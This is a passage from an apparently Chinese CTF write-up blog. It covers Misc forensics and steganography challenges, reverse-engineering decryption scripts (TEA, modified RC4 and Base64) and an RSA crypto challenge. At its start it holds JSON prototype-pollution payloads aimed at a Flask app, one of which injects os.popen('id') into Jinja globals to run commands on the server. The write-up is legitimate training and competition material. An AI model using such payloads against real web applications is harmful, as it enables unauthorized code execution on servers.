class="built_in">_</span>end<span class="built_in">_</span>string&quot;:&quot;<span class="keyword">\n</span>&quot;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>&quot; : &#123;</span><br><span class="line">        &quot;<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;</span><br><span class="line">                &quot;<span class="built_in">_</span>got<span class="built_in">_</span>first<span class="built_in">_</span>request&quot; : null</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>&quot; : &#123;</span><br><span class="line">        &quot;<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;</span><br><span class="line">                &quot;jinja<span class="built_in">_</span>env&quot; : &#123;&quot;globals&quot;:&#123;&quot;value&quot;:&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;&#125;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>&quot; : &#123;</span><br><span class="line">        &quot;<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;</span><br><span class="line">                &quot;env&quot; : &quot;yolo&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="misc-dacongのWindows"><a href="#misc-dacongのWindows" class="headerlink" title="misc-dacongのWindows"></a><strong>misc-dacongのWindows</strong></h2><p>从raw中dump出flag3.txt<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337210349-3a37d591-c681-4360-80dd-6868bebe6e82.png#averageHue=%23d1dbd1&clientId=u37d03602-9a3e-4&from=paste&height=87&id=ueb94fae7&originHeight=131&originWidth=830&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=435841&status=done&style=none&taskId=ue6353239-d28e-458e-81b5-65ba1addfba&title=&width=553.3333333333334" alt="image.png"><br>根据题目提示重要的表被修改，即为注册表。在其中发现可疑数据，即为密钥<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337217152-9b500261-b954-4dfd-993e-9f4f8e500fae.png#averageHue=%231c1b1b&clientId=u37d03602-9a3e-4&from=paste&height=152&id=u7675e9b7&originHeight=228&originWidth=831&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=759403&status=done&style=none&taskId=u9ce5cfe2-c237-4e79-b3d5-5805a1ffdcf&title=&width=554" alt="image.png"><br>通过AES解密可得flag3<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337236501-a9cd9063-a617-4858-911e-2a6ef71c2355.png#averageHue=%23fafafa&clientId=u37d03602-9a3e-4&from=paste&height=107&id=u84e49fa7&originHeight=161&originWidth=830&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=535630&status=done&style=none&taskId=u1705dbbf-92f7-4536-b94d-28c580f186a&title=&width=553.3333333333334" alt="image.png"><br>在Music文件夹下发现线索<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337250879-3304c802-e193-415b-bcbe-9342835ef9c5.png#averageHue=%23262626&clientId=u37d03602-9a3e-4&from=paste&height=55&id=ufeb45b43&originHeight=82&originWidth=831&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=273175&status=done&style=none&taskId=ue6a76a18-81df-497c-a0c7-bc20d7b3fc8&title=&width=554" alt="image.png"><br>发现要“听”音乐<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337264229-dc24ae1d-1e29-461a-9a77-30e68d3a0093.png#averageHue=%23292929&clientId=u37d03602-9a3e-4&from=paste&height=185&id=ua99a8b96&originHeight=278&originWidth=830&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=924806&status=done&style=none&taskId=u934d7a5c-5be4-43d8-9c10-1910d417e2d&title=&width=553.3333333333334" alt="image.png"><br>将这些dump下来后发现是sstv解密，在编号为dacong39的下面发现flag1<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337276108-0ae7cee1-435d-4808-8194-8bbe6db908ae.png#averageHue=%2395df93&clientId=u37d03602-9a3e-4&from=paste&height=362&id=u0600e876&originHeight=543&originWidth=732&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1593099&status=done&style=none&taskId=u0801a486-e92c-4fa7-b3bf-3ad060352a2&title=&width=488" alt="image.png"><br>通过搜索发现secret.rar<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337352448-9950b773-0f66-4958-95eb-7e08bdab21b2.png#averageHue=%23212020&clientId=u37d03602-9a3e-4&from=paste&height=429&id=u4361930e&originHeight=644&originWidth=1446&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=150594&status=done&style=none&taskId=u183c6de7-6533-49dd-bf33-358c7a3e61c&title=&width=964" alt="image.png"><br>解压压缩包发现flag2.txt，snow隐写解得flag2<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337553720-b9e31dc9-a161-4e1e-acba-53aab7612000.png#averageHue=%23e2a95c&clientId=u37d03602-9a3e-4&from=paste&height=201&id=u7cc49dd0&originHeight=302&originWidth=1569&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=44436&status=done&style=none&taskId=u18564872-8d47-4f19-a2c6-af10d152679&title=&width=1046" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337610747-1fa02b72-094e-4aae-ac9a-cefc52dec30d.png#averageHue=%231a1a1a&clientId=u37d03602-9a3e-4&from=paste&height=81&id=ufe2d2f99&originHeight=122&originWidth=1075&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=18837&status=done&style=none&taskId=u0dcfeb82-60ae-4912-a812-a33a54c4a5c&title=&width=716.6666666666666" alt="image.png"></p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a><strong>签到</strong></h2><p>打开即得<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337636401-1a809953-9fd2-48a3-bc56-3fdb052d383f.png#averageHue=%23969992&clientId=u37d03602-9a3e-4&from=paste&height=331&id=u09e491f9&originHeight=497&originWidth=831&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1655271&status=done&style=none&taskId=u4f1480a3-a4d0-49e5-a9a6-980c161d8ee&title=&width=554" alt="image.png"></p>
<h2 id="Nahida"><a href="#Nahida" class="headerlink" title="Nahida"></a><strong>Nahida</strong></h2><p>通过工具re一下，获得可爱的纳西妲<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337671624-13658f7b-163e-4dcd-b37c-cb769fbe0e9e.png#averageHue=%23f5f5f4&clientId=u37d03602-9a3e-4&from=paste&height=115&id=ude50a980&originHeight=172&originWidth=831&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=572902&status=done&style=none&taskId=ubb1b8a9c-992e-4e8d-8931-bef55d8904d&title=&width=554" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337675984-5ba79f94-2345-425a-9c39-e14b4abe1d72.png#averageHue=%234470c6&clientId=u37d03602-9a3e-4&from=paste&height=126&id=u2e02edb8&originHeight=189&originWidth=211&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=160042&status=done&style=none&taskId=ubfc347f3-9791-4a29-a050-dc47692b411&title=&width=140.66666666666666" alt="image.png"><br>后通过Nahida这一密钥用slienteye解密，获得flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337691317-91920846-c03e-4098-8571-842997208db1.png#averageHue=%23b7bb9b&clientId=u37d03602-9a3e-4&from=paste&height=349&id=u25adae11&originHeight=524&originWidth=473&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=993618&status=done&style=none&taskId=uf3a5df71-26ac-4e02-a85f-2181d2b087c&title=&width=315.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337696449-58a6495a-1b53-4ec0-b91c-c9bf81bbe560.png#averageHue=%23b2c192&clientId=u37d03602-9a3e-4&from=paste&height=271&id=u9c087047&originHeight=407&originWidth=592&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=965821&status=done&style=none&taskId=ue94bbacb-4edb-46f4-bc84-4706953b5ad&title=&width=394.6666666666667" alt="image.png"></p>
<h2 id="Misc-dacongのsecret"><a href="#Misc-dacongのsecret" class="headerlink" title="Misc-dacongのsecret"></a><strong>Misc-dacongのsecret</strong></h2><p>用工具进行盲水印解密，解得压缩包1密码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703337759545-6ffd1007-b958-4332-aa7e-992069a82469.png#averageHue=%23646464&clientId=u37d03602-9a3e-4&from=drop&height=312&id=u0dadc513&originHeight=1024&originWidth=1024&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=275197&status=done&style=none&taskId=u500d5888-7d95-4077-a6e4-7942b85522a&title=&width=312.3333435058594" alt="dacong1hao_fft.png"><br>通过pngcheck发现IDAT头异常<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703338099756-c1929883-1121-4a40-8694-826377858e80.png#averageHue=%23201f1f&clientId=u37d03602-9a3e-4&from=paste&height=364&id=u2fdda904&originHeight=836&originWidth=1010&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=135022&status=done&style=none&taskId=u1324cb2d-8de8-4bd0-b4be-c3c3e024ad5&title=&width=439.3333740234375" alt="image.png"><br>提取加上png的文件头，爆破宽高，获得压缩包2密码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703338178277-20230d76-b325-4016-8a07-b4f5af4d6fed.png#averageHue=%232c2c2c&clientId=u37d03602-9a3e-4&from=paste&height=121&id=u5fb8aa01&originHeight=182&originWidth=896&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=22486&status=done&style=none&taskId=ud6f24cf9-e24c-40df-9fe6-a15a89d5ad1&title=&width=597.3333333333334" alt="image.png"><br>解得xiaohongmao.txt发现是base64隐写，通过脚本解得密码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703338410468-faaf91c5-4de7-40e5-8a2c-a7eb624f6f36.png#averageHue=%231e1d1c&clientId=u37d03602-9a3e-4&from=paste&height=46&id=u48cd8598&originHeight=69&originWidth=1785&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=13841&status=done&style=none&taskId=u1cd610ca-e252-47cf-9634-9496ce45879&title=&width=1190" alt="image.png"><br>通过JPHS解密得到flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703338629017-a8ff2681-8949-4b32-b7c1-a0a631e9db77.png#averageHue=%23f5f4f4&clientId=u37d03602-9a3e-4&from=paste&height=63&id=u6a4dc51e&originHeight=95&originWidth=420&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=9410&status=done&style=none&taskId=u5f54754a-0aa4-41e6-be88-ccbe9ea2748&title=&width=280" alt="image.png"></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="我的牢大啊！！"><a href="#我的牢大啊！！" class="headerlink" title="我的牢大啊！！"></a>我的牢大啊！！</h2><p>在红框处发现关键性函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703338725783-60d66f38-b133-4482-b35f-fba3733fe3f8.png#averageHue=%23252321&clientId=u37d03602-9a3e-4&from=paste&height=529&id=ua261af1f&originHeight=794&originWidth=2126&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=223592&status=done&style=none&taskId=u05914f2f-6781-4d07-b753-3d5a1c6f631&title=&width=1417.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703338805164-39178680-f769-43bc-b15b-45e2a1f1238e.png#averageHue=%23252524&clientId=u37d03602-9a3e-4&from=paste&height=390&id=u6804a9c8&originHeight=585&originWidth=2096&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=92965&status=done&style=none&taskId=u56a5a890-24ac-4cec-a1b3-d2949aee348&title=&width=1397.3333333333333" alt="image.png"><br>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    v1 = c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    delta =<span class="number">2654435769</span></span><br><span class="line">    sum1 = c_uint32(delta * <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1.value -= ((v0.value &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0.value + sum1.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>])</span><br><span class="line">        v0.value -= ((v1.value &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1.value + sum1.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>])</span><br><span class="line">        sum1.value -= delta</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((v0.value&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((v1.value&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    a = [<span class="number">3363017039</span>, <span class="number">1247970816</span>, <span class="number">549943836</span>, <span class="number">445086378</span>, <span class="number">3606751618</span>, <span class="number">1624361316</span>, <span class="number">3112717362</span>, <span class="number">705210466</span>, <span class="number">3343515702</span>, <span class="number">2402214294</span>,</span><br><span class="line">         <span class="number">4010321577</span>, <span class="number">2743404694</span>]</span><br><span class="line">    k = [<span class="number">286331153</span>, <span class="number">286331153</span>, <span class="number">286331153</span>, <span class="number">286331153</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">        res = decrypt(a[i:i+<span class="number">2</span>], k)</span><br></pre></td></tr></table></figure>
<p>解得flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703338896702-c4c5d291-9fa5-4a5d-afbe-6efc3b6d7226.png#averageHue=%231e1d1b&clientId=u37d03602-9a3e-4&from=paste&height=76&id=u57d6f5d7&originHeight=114&originWidth=1889&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=26476&status=done&style=none&taskId=u60dce11c-e4e7-475d-8fec-42656185fdc&title=&width=1259.3333333333333" alt="image.png"></p>
<h2 id="感觉有点点简单？？"><a href="#感觉有点点简单？？" class="headerlink" title="感觉有点点简单？？"></a>感觉有点点简单？？</h2><p>在主函数中发现有两次加密<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703339051150-e41b20fb-6969-4756-ab02-2b5547535533.png#averageHue=%2334312e&clientId=u37d03602-9a3e-4&from=paste&height=319&id=ufd294c02&originHeight=479&originWidth=2006&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=356635&status=done&style=none&taskId=uca6dddfa-bdc5-4b33-8e7f-f67c0d8cab1&title=&width=1337.3333333333333" alt="image.png"><br>魔改RC4<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703338965415-e260ac05-e37f-4dca-95d1-719742abb3b3.png#averageHue=%232f2f2d&clientId=u37d03602-9a3e-4&from=paste&height=685&id=u38278224&originHeight=1027&originWidth=1848&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=293881&status=done&style=none&taskId=uae1754b6-78b6-46ee-a566-e6b58d74beb&title=&width=1232" alt="image.png"><br>魔改Base64<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38641338/1703339102650-76bd05ad-c5ee-4bc9-b2aa-848cbb013cac.png#averageHue=%232f2e2d&clientId=u37d03602-9a3e-4&from=paste&height=603&id=u047806ee&originHeight=905&originWidth=1721&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=303186&status=done&style=none&taskId=u871f10c8-b854-40a9-9fc9-5c93dd35d6e&title=&width=1147.3333333333333" alt="image.png"><br>爆破脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ba64_decode</span>(<span class="params">str1_1</span>):</span><br><span class="line">    mapping = <span class="string">&quot;4KBbSzwWClkZ2gsr1qA+Qu0FtxOm6/iVcJHPY9GNp7EaRoDf8UvIjnL5MydTX3eh&quot;</span></span><br><span class="line">    data_1 = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">    flag_1 = [<span class="number">0</span>] * <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                flag_1[<span class="number">0</span>] = i</span><br><span class="line">                flag_1[<span class="number">1</span>] = y</span><br><span class="line">                flag_1[<span class="number">2</span>] = k</span><br><span class="line">                data_1[<span class="number">0</span>] = (mapping[flag_1[<span class="number">0</span>] &amp; <span class="number">0x3f</span>])</span><br><span class="line">                data_1[<span class="number">1</span>] = (mapping[(<span class="number">4</span> * (flag_1[<span class="number">1</span>] &amp; <span class="number">0xF</span>)) | ((flag_1[<span class="number">0</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>)])</span><br><span class="line">                data_1[<span class="number">2</span>] = (mapping[(<span class="number">16</span> * (flag_1[<span class="number">2</span>] &amp; <span class="number">3</span>)) | (flag_1[<span class="number">1</span>] &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>])</span><br><span class="line">                data_1[<span class="number">3</span>] = (mapping[(flag_1[<span class="number">2</span>] &amp; <span class="number">0xfc</span>) &gt;&gt; <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> data_1 == str1_1:</span><br><span class="line">                    <span class="built_in">print</span>(flag_1)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;failure!&quot;</span>)</span><br><span class="line">encoded_str = <span class="built_in">list</span>(<span class="string">&quot;6zviISn2McHsa4b108v29tbKMtQQXQHA+2+sTYLlg9v2Q2Pq8SP24Uw&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded_str), <span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;encData=&quot;</span>, [x <span class="keyword">for</span> x <span class="keyword">in</span> encoded_str[i:i + <span class="number">4</span>]])</span><br><span class="line">    ba64_decode([x <span class="keyword">for</span> x <span class="keyword">in</span> encoded_str[i:i + <span class="number">4</span>]])</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">key, ciphertext</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">64</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">64</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">64</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">64</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        keystream_byte = S[(S[i] + S[j]+(i^j)) % <span class="number">64</span>]</span><br><span class="line">        plaintext.append(char ^ ((i^j)&amp;keystream_byte))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line">key = [<span class="built_in">ord</span>(x)<span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;the_key_&#x27;</span>]</span><br><span class="line">data = [<span class="number">92</span>, <span class="number">33</span>, <span class="number">123</span>,<span class="number">51</span>, <span class="number">81</span>, <span class="number">51</span>,<span class="number">56</span>, <span class="number">40</span>, <span class="number">58</span>,<span class="number">43</span>, <span class="number">48</span>, <span class="number">64</span>,<span class="number">22</span>, <span class="number">44</span>, <span class="number">51</span>,<span class="number">37</span>, <span class="number">54</span>, <span class="number">4</span>,<span class="number">56</span>, <span class="number">70</span>, <span class="number">81</span></span><br><span class="line">    ,<span class="number">60</span>, <span class="number">37</span>, <span class="number">74</span>,<span class="number">19</span>, <span class="number">51</span>, <span class="number">57</span>,<span class="number">59</span>, <span class="number">105</span>, <span class="number">39</span>,<span class="number">77</span>, <span class="number">41</span>, <span class="number">51</span>,<span class="number">20</span>, <span class="number">51</span>, <span class="number">70</span>,<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>,<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(rc4_decrypt(key,data))</span><br></pre></td></tr></table></figure>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="010101"><a href="#010101" class="headerlink" title="010101"></a><strong>010101</strong></h2><p>这道题我看到的时候，发现再怎么改0或改1，都离不开p1，那就干脆直接爆破就行。<br>当时试了nc获得的两组数，第一组不行，第二组直接秒出？？？绝了（（（<br>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">交互获得相关参数</span></span><br><span class="line"><span class="string">from pwn import *</span></span><br><span class="line"><span class="string">from pwnlib.util.iters import mbruteforce</span></span><br><span class="line"><span class="string">from hashlib import *</span></span><br><span class="line"><span class="string">import string</span></span><br><span class="line"><span class="string">import itertools</span></span><br><span class="line"><span class="string">table = string.ascii_letters + string.digits</span></span><br><span class="line"><span class="string">io = remote(host=&#x27;124.71.177.14&#x27;, port=10001)</span></span><br><span class="line"><span class="string">def pow1():</span></span><br><span class="line"><span class="string">    io.recvuntil(b&#x27;XXXX + &#x27;)</span></span><br><span class="line"><span class="string">    suffix = io.recv(16).decode(&quot;utf8&quot;)</span></span><br><span class="line"><span class="string">    io.recvuntil(b&#x27;:&#x27;)</span></span><br><span class="line"><span class="string">    cipher = io.recvline().strip().decode(&quot;utf8&quot;)</span></span><br><span class="line"><span class="string">    proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;)</span></span><br><span class="line"><span class="string">    io.sendlineafter(b&#x27;XXXX:\n&#x27;, proof.encode())</span></span><br><span class="line"><span class="string">    return cipher</span></span><br><span class="line"><span class="string">pow1()</span></span><br><span class="line"><span class="string">print(1)</span></span><br><span class="line"><span class="string">io.interactive()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">792908794100958630009551791192012788215767793376515923386150557751669440792099379721797863861528850270410442732340261232835729586736727652408261879302580402737461544005714770675176818949283961385523984555021916340005026316919722095079493612335316090685462008977402970837596267459493545692026071981177193003203425947464585563483693433909740049216472576492560671118567309776235209897710370428452390888487198265771900508210932412185467020691290132534307467324083322275977321788250381967700577917107380118849821575050844480149313881647170152691473830183471738191475512162348449177251887945023598843307733334574999785412893451977914058501753150193485223302926743833969852813275492521331132383949310342147308210216661506704904482949985300647206141570640200752477195588469779339401778107606588819974878384559339381155916295541596270900322077570269853558166244206015042715432187519785589225932667246444820707537160646628170425508292260369706711388272811878145289450542635611610706989936485646092106469891231267860870036165273651666313209892657854523552183928438066220053483804867149015247700053607773706653112889208575942032966056369438598458733695849741935864655386178471496015269253667788679960793946563340487185863323609264093766494635279</span></span><br><span class="line">p = <span class="string">&quot;1100111110010000110010010100010101101111101111001100100001111001010011011000000000110110100001001110101101011010101001110011100111001110011011110110101000110111100100010111000110111000100011101000001011011011110101010101011110001111000001010111101100101010101001011011101000110011111000101101001010100011010001000110101111101110011011101111101011110010010010000001010000111001001001100101101111100111111111100101001000011010110010011001000110101011000000100110011001011011101101101001110101011100101111011100011100000101100001001000001001111100001000100010000100100000000111010000100111000000100111000100011001011010001010110011001001001111101100100011100000010111001111001011010011111001010000110100110001010101100111111010011000001000011011000101010110010101010000110111101001010101101110110111010001110011101101111111011111000011010111111111011011111110011101010110000111100011111000100011101101001011111000110011111011000111011101101011110001011010001100101000001111100110111110001010001100110000000111111011010100000111011111011010011011100101111110000100010101010010100110100011010111111100111011011110001000100000101111100000100001000101001000100000100000